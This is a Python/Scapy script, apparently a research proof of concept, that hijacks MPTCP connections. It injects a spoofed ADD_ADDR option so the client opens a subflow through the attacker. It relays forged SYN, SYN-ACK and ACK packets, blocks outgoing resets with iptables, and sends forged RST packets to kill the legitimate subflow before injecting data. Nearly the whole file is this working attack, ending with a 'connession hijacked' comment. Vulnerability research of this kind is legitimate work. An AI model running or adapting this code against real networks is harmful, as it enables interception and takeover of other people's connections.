#Author: fabriziodemaria

import logging
import threading
import sys
from random import randint

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *
from subprocess import check_output as execCommand
from sniff_script import *


ADDRESS_ID = 6
SYN_TRANSMITTED = 1 #TODO values different than 1 might cause problems
THREAD_SYNC_TIME = 2

class SYNThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
    def run(self):
        self.pkt = sniff_SYN(self.clientIf)


class SYNACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, serverIf, serverIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIf = serverIf
        self.serverIP = serverIP
    def run(self):
        self.pkt = sniff_SYNACK(self.serverIf, self.serverIP)


class ACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf, myIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
        self.myIP = myIP
    def run(self):
        self.pkt = sniff_ACK(self.clientIf, self.myIP)


def sniff_ACK(clientIf, myIP):
    print "Start looking for ACK"
    pkt = sniff_first_ack(clientIf, myIP)
    return pkt


def sniff_SYNACK(serverIf, serverIP):
    print "Start looking for SYNACK"
    pkt = sniff_first_synack(serverIf, serverIP)
    return pkt


def sniff_SYN(clientIf):
    print "Start looking for SYN"
    pkt = sniff_first_syn(clientIf)
    return pkt


def disable_RST():
    execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP", shell = True)
    execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP", shell = True)
    time.sleep(THREAD_SYNC_TIME)


def enable_RST():
    execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j ACCEPT", shell = True)
    execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j ACCEPT", shell = True)
    time.sleep(THREAD_SYNC_TIME)

def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    return pkt


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False


def get_DSS_Ack(pkt):
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "DSS":
                    print o.data_ack
                    return o.data_ack
    return -1


def send_your_data():
    pass


def generateAddAddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=myIP))]))
    return pkt


def generateDSS(myIP, myPort, dstIP, dstPort, sniffedSeq, sniffedAck, dssack):
    pkt = (IP(version=4L,src=myIP,dst=dstIP)/                            \
             TCP(sport=myPort,dport=dstPort,flags="PA",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_DSS_Ack64Map(flags=0x05, data_ack=randintb(32), dsn=dssack,
                         subflow_seqnum=1,
                         datalevel_len=2))])/ "2")
    return pkt


def generateRST(srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="R",seq=sniffedSeq,ack=0))
    return pkt


def forge_ack(pkt, myIP, serverIP, clientIP, clientIf, serverEth):
    # Modify SYNACK from server
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP
    # Ethernet src/dst has to be updated in the forward phase
    pkt2 = sniff_first_start(clientIf, serverIP)
    del pkt[Ether].src
    pkt[Ether].dst = serverEth
    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def forge_synack(pkt, myIP, serverIP, clientIP, clientIf, clientPort):
    # Modify SYNACK from server
    pkt[IP].dst = clientIP
    pkt[IP].src = myIP
    pkt[TCP].dport = clientPort
    # Ethernet src/dst has to be updated in the forward phase
    pkt2 = sniff_first_start(clientIf, serverIP)
    del pkt[Ether].src
    pkt[Ether].dst = pkt2[Ether].dst
    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def forge_syn(pkt, myIP, serverIP, clientIP, serverIf, serverEth):
    # Modify SYN from Client
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP
    pkt = modify_addr_id(pkt, ADDRESS_ID) # Might be not necessary

    # Ethernet src/dst has to be updated in the forward phase
    del pkt[Ether].src
    pkt[Ether].dst = serverEth

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum

    # Genereting the list
    listp = []
    for i in range(0, SYN_TRANSMITTED):
        # pkt[TCP].sport += randint(10,500)
        listp.append(pkt.copy())
    return listp


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('myIP', action='store', help='My IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    if len(sys.argv)!=6:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def randintb(n):
    """Picks a n-bits value at random"""
    return random.randrange(0, 1L<<(n-1))


def main():
    args = parse_args()

    MY_IP = args.myIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf

    # Important step to maintain TCP conenction during slow packet forging process
    disable_RST()

    # Start waiting for SYN from client
    thread1 = SYNThread(1, "Syn capturing thread", 1, CLIENT_IF)
    thread1.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread1 to start tcpdumping

    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1) # This might not work if only other clients are used to send data (disable other interfaces)
    pktl2 = sniff(iface=SERVER_IF, lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1)

    CLIENT_ETHER = pktl[0][Ether].src
    SERVER_ETHER = pktl2[0][Ether].dst
    SERVER_PORT = pktl[0][TCP].dport

    # Sending ADD_ADDR to client
    print "Sending ADD_ADDR to client"
    send(generateAddAddr(MY_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack), (pktl[0][TCP].seq)-1000*1427), iface=CLIENT_IF, verbose=0)

    thread1.join() # This should contain the received SYN from the client
    # thread1.pkt.show()

    print "Phase 1 - Received SYN from client"

    # Start waiting for SYNACK from server and the next ACK from the client now
    thread2 = SYNACKThread(1, "SynAck capturing thread", 1, SERVER_IF, SERVER_IP)
    thread2.start()
    thread3 = ACKThread(1, "Ack capturing thread", 1, CLIENT_IF, MY_IP)
    thread3.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread2 and thread3 to start tcpdumping

    # Sending SYN to server. Also needed Ethernet information from previous stage just to avoid sniffing again
    listp = forge_syn(thread1.pkt.copy(), MY_IP, SERVER_IP, CLIENT_IP, SERVER_IF, SERVER_ETHER)
    print "Sending SYN to server"
    sendp(listp, iface=SERVER_IF, verbose=0)

    thread2.join() # This should contain the received SYNACK from the server
    # thread2.pkt.show()

    print "Phase 2 - Received SYNACK from server"

    # Sending SYNACK to the client
    pkt = forge_synack(thread2.pkt, MY_IP, SERVER_IP, CLIENT_IP, CLIENT_IF, thread1.pkt[TCP].sport)
    print "Sending SYNACK to client"
    # pkt.show2()
    sendp(pkt.copy(), iface=CLIENT_IF, verbose=0)

    thread3.join() # This should contain the received ACK from the client
    # thread3.pkt.show()
    print "Phase 3 - Received ACK from the client"

    thread4 = ACKThread(1, "Data Ack capturing thread", 1, SERVER_IF, MY_IP)
    thread4.start()
    time.sleep(THREAD_SYNC_TIME)

    # Sending ACK to the server
    pkt = forge_ack(thread3.pkt.copy(), MY_IP, SERVER_IP, CLIENT_IP, SERVER_IF, SERVER_ETHER)
    print "Sending ACK to server"
    # pkt.show2()

    MY_PORT = pkt[TCP].sport

    sendp(pkt.copy(), iface=SERVER_IF, verbose=0)

    print "Phase 4 - Sent ACK to the server"

    thread4.join() # This should containt MPTCP Data option with Ack information
    # dssack = get_DSS_Ack(thread4.pkt)
    # pwnd = generateDSS(MY_IP, MY_PORT, SERVER_IP, SERVER_PORT, thread4.pkt[TCP].ack, thread4.pkt[TCP].seq, dssack)
    pwnd = (IP(version=4L,src=MY_IP,dst=SERVER_IP)/                            \
             TCP(sport=MY_PORT,dport=SERVER_PORT,flags="PA",seq=thread4.pkt[TCP].ack,ack=thread4.pkt[TCP].seq)\
                 / "2")

    # Now we want to RST the other subflow
    enable_RST()

    # RST from server to client
    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: sniff_start_lambda(p, SERVER_IP), count=1)
    pktl2 = sniff(iface=SERVER_IF, lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1)

    r1 = generateRST(SERVER_IP, pktl[0][TCP].sport, CLIENT_IP, pktl[0][TCP].dport, (pktl[0][TCP].seq), (pktl[0][TCP].ack)+1)
    send(r1, iface=CLIENT_IF, verbose=0)
    time.sleep(THREAD_SYNC_TIME)
    r2 = generateRST(CLIENT_IP, pktl2[0][TCP].sport, SERVER_IP, pktl2[0][TCP].dport, (pktl2[0][TCP].seq), (pktl2[0][TCP].ack)+1)
    send(r2, iface=CLIENT_IF, verbose=0)

    # Congratulation, connession hijacked!


    # send_your_data()
    # pwnd = (IP(version=4L,src=MY_IP,dst=SERVER_IP)/TCP(sport=pktl2[0][TCP].sport,dport=pktl2[0][TCP].dport)/"CIAO")
    pwnd.show()
    send(pwnd, iface=SERVER_IF, verbose=3)

    return

if __name__ == "__main__":
    main()
